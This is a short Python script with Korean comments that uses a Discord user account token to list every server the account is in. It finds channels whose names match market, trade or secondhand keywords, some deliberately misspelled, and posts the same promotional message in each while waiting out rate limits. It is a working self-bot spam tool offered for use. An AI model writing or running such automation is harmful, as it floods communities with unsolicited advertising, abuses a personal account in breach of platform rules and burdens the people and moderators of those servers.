import requests
import time
TOKEN = '본인의 토큰'

def isRatelimit(obj):
    try:
        if obj.get("global", None) != None:
            return True, obj.get("retry_after", 0.0)
        else:
            return False, 0
    except:
        return False, 0

headers = {
    'Authorization': f'{TOKEN}'
}
message='''
홍보 글자''' # 본인의 홍보 멘트를 작성하세요

response = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
guilds = response.json()


for guild in guilds:
    guild_id = guild['id']
    response = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
    channels = response.json()

    for channel in channels:
        try:
            channel_name = channel['name']
            if channel['type'] != 4:
                if '마켓' in channel_name or '거래' in channel_name or '마캣' in channel_name or '거레' in channel_name or '중고' in channel_name or '장터' in channel_name:

                    print(f"서버이름 : {guild['name']}, 채널 이름 : {channel_name} ({channel['id']})")
                    headers={
                    'Authorization': f'{TOKEN}',
                    'Content-Type': 'application/json',
                    }

                    data = {'content': message}

                    response = requests.post(f'https://discord.com/api/v9/channels/{channel["id"]}/messages', headers=headers,
                                             json=data)
                    ratelimit, sleep = isRatelimit(response.json())
                    if ratelimit:
                        time.sleep(sleep)
                        print("레이트리밋에 걸렸습니다. 잠시후 재가동됩니다.")

                    if response.status_code == 200:
                        print('메시지가 성공적으로 전송되었습니다.')
                    else:
                        print('메시지 전송 실패:', response.text)

        except:
            pass
